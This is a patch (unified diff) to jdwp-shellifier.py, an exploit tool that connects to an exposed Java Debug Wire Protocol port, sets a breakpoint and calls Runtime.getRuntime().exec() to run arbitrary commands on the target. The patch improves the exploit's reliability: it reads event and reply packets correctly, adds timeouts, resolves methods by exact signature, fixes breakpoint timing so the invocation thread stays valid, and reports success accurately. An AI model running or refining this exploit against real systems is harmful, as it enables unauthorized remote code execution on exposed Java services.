@@ -1,0 +1,165 @@
+--- a/jdwp-shellifier.py
++++ b/jdwp-shellifier.py
+@@ -84,6 +84,7 @@
+         self.methods = {}
+         self.fields = {}
+         self.id = 0x01
++        self.events = []
+         return
+ 
+     def create_packet(self, cmdsig, data=b""):
+@@ -102,18 +103,28 @@
+             if chunk:
+                 buf += chunk
+             else:
+-                time.sleep(0.1)
++                raise EOFError("JDWP peer closed the connection")
+         return buf
+ 
++    def read_packet(self):
++        header = self.recv_all(11)
++        pktlen, pktid, flags, code = struct.unpack(">IIBH", header)
++        if not 11 <= pktlen <= 64 * 1024 * 1024:
++            raise ValueError("Invalid JDWP packet length: %d" % pktlen)
++        return pktid, flags, code, self.recv_all(pktlen - 11)
++
+     def read_reply(self):
+-        header = self.recv_all(11)
+-        pktlen, pktid, flags, errcode = struct.unpack(">IIBH", header)
+-
+-        if flags == REPLY_PACKET_TYPE:
+-            if errcode :
+-                raise Exception("Received errcode %d" % errcode)
+-
+-        return self.recv_all(pktlen - 11)
++        while True:
++            pktid, flags, code, data = self.read_packet()
++            # Event.Composite may arrive before a command's reply.
++            if flags == REQUEST_PACKET_TYPE and code == 0x4064:
++                self.events.append(data)
++                continue
++            if flags != REPLY_PACKET_TYPE or pktid != self.id - 2:
++                raise ValueError("Unexpected JDWP reply: id=%d flags=%d" % (pktid, flags))
++            if code:
++                raise RuntimeError("Received JDWP error code %d" % code)
++            return data
+ 
+     def parse_entries(self, buf, formats, explicit=True):
+         entries = []
+@@ -189,6 +200,7 @@
+ 
+     def handshake(self, host, port):
+         s = socket.socket()
++        s.settimeout(15)
+         try:
+             s.connect( (host, port) )
+         except socket.error as msg:
+@@ -443,8 +455,12 @@
+         return
+ 
+     def wait_for_event(self):
+-        buf = self.read_reply()
+-        return buf
++        if self.events:
++            return self.events.pop(0)
++        pktid, flags, code, data = self.read_packet()
++        if flags != REQUEST_PACKET_TYPE or code != 0x4064:
++            raise ValueError("Expected JDWP Event.Composite")
++        return data
+ 
+     def parse_event_breakpoint(self, buf, eventId):
+         num = struct.unpack(">I", buf[2:6])[0]
+@@ -470,7 +486,7 @@
+ 
+     # 2. get getRuntime() meth reference
+     jdwp.get_methods(runtimeClass["refTypeId"])
+-    getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
++    getRuntimeMeth = jdwp.get_method_by_name("getRuntime", runtimeClass["refTypeId"], "()Ljava/lang/Runtime;")
+     if getRuntimeMeth is None:
+         print ("[-] Cannot find method Runtime.getRuntime()")
+         return False
+@@ -485,7 +501,7 @@
+         return False
+ 
+     jdwp.get_methods( c["refTypeId"] )
+-    m = jdwp.get_method_by_name( args.break_on_method )
++    m = jdwp.get_method_by_name(args.break_on_method, c["refTypeId"])
+     if m is None:
+         print("[-] Could not access method '%s'" % args.break_on)
+         return False
+@@ -495,11 +511,13 @@
+     loc += jdwp.format( jdwp.methodIDSize, m["methodId"] )
+     loc += struct.pack(">II", 0, 0)
+     data = [ (MODKIND_LOCATIONONLY, loc), ]
++    # Resume before arming the breakpoint. Resuming afterwards can release
++    # an event that has already fired, invalidating its invocation thread.
++    jdwp.resumevm()
+     rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
+     print ("[+] Created break event id=%x" % rId)
+ 
+-    # 4. resume vm and wait for event
+-    jdwp.resumevm()
++    # 4. Wait for the event without releasing its suspension.
+ 
+     print ("[+] Waiting for an event on '%s'" % args.break_on)
+     while True:
+@@ -515,16 +533,16 @@
+ 
+     # 5. Now we can execute any code
+     if args.cmd:
+-        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd, args.no_wait)
++        success = runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd, args.no_wait)
+     else:
+         # by default, only prints out few system properties
+-        runtime_exec_info(jdwp, tId)
++        success = runtime_exec_info(jdwp, tId)
+ 
+     jdwp.resumevm()
+ 
+-    print ("[!] Command successfully executed")
+-
+-    return True
++    if success:
++        print ("[!] Command successfully executed")
++    return success
+ 
+ 
+ def runtime_exec_info(jdwp, threadId):
+@@ -567,7 +585,7 @@
+         return False
+ 
+     jdwp.get_methods(systemClass["refTypeId"])
+-    getPropertyMeth = jdwp.get_method_by_name("getProperty")
++    getPropertyMeth = jdwp.get_method_by_name("getProperty", systemClass["refTypeId"], "(Ljava/lang/String;)Ljava/lang/String;")
+     if getPropertyMeth is None:
+         print ("[-] Cannot find method System.getProperty()")
+         return False
+@@ -720,7 +738,7 @@
+     print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)
+ 
+     # 3. find exec() method
+-    execMeth = jdwp.get_method_by_name("exec")
++    execMeth = jdwp.get_method_by_name("exec", runtimeClassId, "(Ljava/lang/String;)Ljava/lang/Process;")
+     if execMeth is None:
+         print ("[-] Cannot find method Runtime.exec()")
+         return False
+@@ -789,6 +807,7 @@
+     setattr(args, "break_on_method", meth)
+ 
+     retcode = 0
++    cli = None
+ 
+     try:
+         cli = JDWPClient(args.target, args.port)
+@@ -804,10 +823,9 @@
+     except Exception as e:
+         print ("[-] Exception: %s" % e)
+         retcode = 1
+-        cli = None
+ 
+     finally:
+-        if cli:
++        if cli and hasattr(cli, "socket"):
+             cli.leave()
+ 
+     sys.exit(retcode)
